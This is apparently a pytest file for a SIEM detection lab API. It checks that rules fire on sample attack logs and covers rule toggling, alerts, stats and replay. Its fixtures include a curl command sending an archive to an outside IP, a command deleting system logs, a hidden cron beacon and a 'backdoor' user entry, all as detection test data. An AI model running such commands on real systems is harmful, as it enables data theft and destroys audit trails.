"""
Tests for the SIEM Detection Lab REST API.
Run: pytest tests/test_api.py -v
"""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from api.app import app as flask_app


@pytest.fixture(autouse=True)
def clear_alerts():
    """Clear in-memory alerts between tests."""
    from api.app import _alerts
    _alerts.clear()
    yield
    _alerts.clear()


@pytest.fixture
def client():
    flask_app.config["TESTING"] = True
    with flask_app.test_client() as c:
        yield c


SSH_BRUTE_LOG = "Oct  1 14:22:11 bastion sshd[12341]: Failed password for root from 45.142.212.100 port 54321 ssh2"
LOG_DELETE    = "root: rm -f /var/log/auth.log /var/log/syslog"
CRON_MOD      = "(root) CMD (* * * * * /tmp/.hidden/beacon.sh)"
EXFIL_CURL    = "www-data: curl -s -d @/tmp/out.tar.gz https://198.51.100.9/recv"
BENIGN        = "Accepted publickey for deploy from 10.0.0.5 port 22 ssh2"
NMAP_SCAN     = "alice: nmap -sS -p 1-65535 10.0.0.0/24"
NEW_USER      = "new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor"


class TestHealth:
    def test_health_ok(self, client):
        r = client.get("/api/v1/health")
        assert r.status_code == 200
        data = r.get_json()
        assert data["status"] == "healthy"
        assert data["rules_loaded"] > 0


class TestAnalyze:
    def test_detects_ssh_brute_force(self, client):
        r = client.post("/api/v1/analyze", json={"log": SSH_BRUTE_LOG})
        assert r.status_code == 200
        data = r.get_json()
        assert data["alerts_fired"] >= 1
        rule_ids = [a["rule_id"] for a in data["alerts"]]
        assert any(rid.startswith("1001") for rid in rule_ids)

    def test_detects_log_deletion(self, client):
        r = client.post("/api/v1/analyze", json={"log": LOG_DELETE})
        assert r.status_code == 200
        data = r.get_json()
        assert data["alerts_fired"] >= 1
        assert any(a["rule_id"] == "100401" for a in data["alerts"])

    def test_detects_cron_modification(self, client):
        r = client.post("/api/v1/analyze", json={"log": CRON_MOD})
        assert r.status_code == 200
        assert r.get_json()["alerts_fired"] >= 1

    def test_detects_exfiltration(self, client):
        r = client.post("/api/v1/analyze", json={"log": EXFIL_CURL})
        assert r.status_code == 200
        data = r.get_json()
        assert any(a["rule_id"] == "100501" for a in data["alerts"])

    def test_detects_port_scan(self, client):
        r = client.post("/api/v1/analyze", json={"log": NMAP_SCAN})
        assert r.status_code == 200
        assert r.get_json()["alerts_fired"] >= 1

    def test_detects_new_user(self, client):
        r = client.post("/api/v1/analyze", json={"log": NEW_USER})
        assert r.status_code == 200
        assert r.get_json()["alerts_fired"] >= 1

    def test_benign_log_no_alert(self, client):
        r = client.post("/api/v1/analyze", json={"log": BENIGN})
        assert r.status_code == 204

    def test_batch_logs(self, client):
        r = client.post("/api/v1/analyze", json={
            "logs": [SSH_BRUTE_LOG, LOG_DELETE, CRON_MOD, BENIGN, EXFIL_CURL]
        })
        assert r.status_code == 200
        data = r.get_json()
        assert data["logs_analyzed"] == 5
        assert data["alerts_fired"] >= 3

    def test_empty_logs_400(self, client):
        r = client.post("/api/v1/analyze", json={"logs": []})
        assert r.status_code == 400

    def test_too_many_logs_400(self, client):
        r = client.post("/api/v1/analyze", json={"logs": ["x"] * 501})
        assert r.status_code == 400

    def test_missing_body_400(self, client):
        r = client.post("/api/v1/analyze", data="not json", content_type="text/plain")
        assert r.status_code == 400

    def test_critical_alert_has_high_level(self, client):
        r = client.post("/api/v1/analyze", json={"log": LOG_DELETE})
        data = r.get_json()
        for alert in data["alerts"]:
            if alert["rule_id"] == "100401":
                assert alert["level"] >= 13
                assert alert["severity"] == "critical"

    def test_alert_has_mitre_ids(self, client):
        r = client.post("/api/v1/analyze", json={"log": SSH_BRUTE_LOG})
        data = r.get_json()
        for alert in data["alerts"]:
            assert isinstance(alert["mitre_ids"], list)


class TestRules:
    def test_list_all_rules(self, client):
        r = client.get("/api/v1/rules")
        assert r.status_code == 200
        data = r.get_json()
        assert data["total"] >= 20
        assert data["enabled_count"] >= 20

    def test_filter_by_severity(self, client):
        r = client.get("/api/v1/rules?severity=critical")
        data = r.get_json()
        for rule in data["rules"]:
            assert rule["severity"] == "critical"

    def test_get_specific_rule(self, client):
        r = client.get("/api/v1/rules/100401")
        assert r.status_code == 200
        data = r.get_json()
        assert data["rule_id"] == "100401"
        assert "T1070" in data["mitre_ids"]

    def test_get_nonexistent_rule_404(self, client):
        r = client.get("/api/v1/rules/999999")
        assert r.status_code == 404

    def test_disable_rule_stops_detection(self, client):
        # Disable the log deletion rule
        client.patch("/api/v1/rules/100401", json={"enabled": False})
        r = client.post("/api/v1/analyze", json={"log": LOG_DELETE})
        # Should no longer fire 100401
        if r.status_code == 200:
            data = r.get_json()
            assert not any(a["rule_id"] == "100401" for a in data["alerts"])
        # Re-enable
        client.patch("/api/v1/rules/100401", json={"enabled": True})

    def test_reenable_rule_restores_detection(self, client):
        client.patch("/api/v1/rules/100401", json={"enabled": False})
        client.patch("/api/v1/rules/100401", json={"enabled": True})
        r = client.post("/api/v1/analyze", json={"log": LOG_DELETE})
        assert r.status_code == 200
        assert any(a["rule_id"] == "100401" for a in r.get_json()["alerts"])


class TestAlerts:
    def test_alerts_appear_after_analysis(self, client):
        client.post("/api/v1/analyze", json={"log": SSH_BRUTE_LOG})
        r = client.get("/api/v1/alerts")
        assert r.status_code == 200
        assert r.get_json()["total"] >= 1

    def test_filter_alerts_by_severity(self, client):
        client.post("/api/v1/analyze", json={
            "logs": [SSH_BRUTE_LOG, LOG_DELETE, CRON_MOD]
        })
        r = client.get("/api/v1/alerts?severity=critical")
        data = r.get_json()
        for alert in data["alerts"]:
            assert alert["severity"] == "critical"

    def test_limit_parameter(self, client):
        for _ in range(5):
            client.post("/api/v1/analyze", json={"log": SSH_BRUTE_LOG})
        r = client.get("/api/v1/alerts?limit=2")
        assert len(r.get_json()["alerts"]) <= 2


class TestStats:
    def test_stats_structure(self, client):
        client.post("/api/v1/analyze", json={
            "logs": [SSH_BRUTE_LOG, LOG_DELETE, EXFIL_CURL]
        })
        r = client.get("/api/v1/stats")
        assert r.status_code == 200
        data = r.get_json()
        assert "rules" in data
        assert "alerts" in data
        assert "mitre_coverage" in data

    def test_mitre_coverage_increments(self, client):
        client.post("/api/v1/analyze", json={"log": SSH_BRUTE_LOG})
        r = client.get("/api/v1/stats")
        data = r.get_json()
        assert data["mitre_coverage"]["techniques_detected"] >= 1


class TestReplay:
    def test_replay_ssh_brute(self, client):
        r = client.post("/api/v1/replay", json={"scenario": "ssh_brute"})
        assert r.status_code == 200
        data = r.get_json()
        assert data["scenario"] == "ssh_brute"
        assert data["alerts_fired"] >= 1

    def test_replay_invalid_scenario(self, client):
        r = client.post("/api/v1/replay", json={"scenario": "does_not_exist"})
        assert r.status_code == 400

    def test_replay_all_scenarios(self, client):
        r = client.post("/api/v1/replay", json={"scenario": "all"})
        assert r.status_code == 200
        data = r.get_json()
        assert data["alerts_fired"] >= 5
